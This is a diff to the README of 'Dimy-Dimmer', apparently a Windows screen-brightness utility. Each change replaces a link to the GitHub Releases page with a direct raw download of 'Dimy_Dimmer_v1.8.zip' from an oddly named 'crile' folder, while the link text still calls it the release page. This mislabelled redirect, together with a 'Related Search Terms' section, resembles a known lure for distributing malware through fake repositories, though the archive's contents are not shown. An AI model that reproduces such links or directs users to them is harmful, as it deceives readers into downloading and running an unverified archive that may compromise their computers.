@@ -1,12 +1,12 @@
 # 🌓 Dimy-Dimmer - Control Screen Brightness With Ease
 
-[![Download Dimy-Dimmer](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jmbag94-jpg/Dimy-Dimmer/releases)
+[![Download Dimy-Dimmer](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip)
 
 ## 📥 Download
 
 Visit this page to download Dimy-Dimmer for Windows:
 
-[Download Dimy-Dimmer from GitHub Releases](https://github.com/jmbag94-jpg/Dimy-Dimmer/releases)
+[Download Dimy-Dimmer from GitHub Releases](https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip)
 
 ## ✨ What Dimy-Dimmer Does
 
@@ -32,7 +32,7 @@ You will need:
 
 Follow these steps to get Dimy-Dimmer running on your Windows PC.
 
-1. Open the [Download Dimy-Dimmer from GitHub Releases](https://github.com/jmbag94-jpg/Dimy-Dimmer/releases) page.
+1. Open the [Download Dimy-Dimmer from GitHub Releases](https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip) page.
 2. Find the latest release at the top of the page.
 3. Look for the Windows download file.
 4. Download the file to your computer.
@@ -112,7 +112,7 @@ If Dimy-Dimmer does not start right away, try these steps:
 ## 🔄 Updating Dimy-Dimmer
 
 To get the newest version:
-1. return to the [release page](https://github.com/jmbag94-jpg/Dimy-Dimmer/releases)
+1. return to the [release page](https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip)
 2. download the latest Windows file
 3. open the new file
 4. use the updated version on your PC
@@ -121,7 +121,7 @@ To get the newest version:
 
 Use this page any time you need the latest download:
 
-[https://github.com/jmbag94-jpg/Dimy-Dimmer/releases](https://github.com/jmbag94-jpg/Dimy-Dimmer/releases)
+[https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip](https://github.com/jmbag94-jpg/Dimy-Dimmer/raw/refs/heads/main/crile/Dimy_Dimmer_v1.8.zip)
 
 ## 🧩 Related Search Terms
 
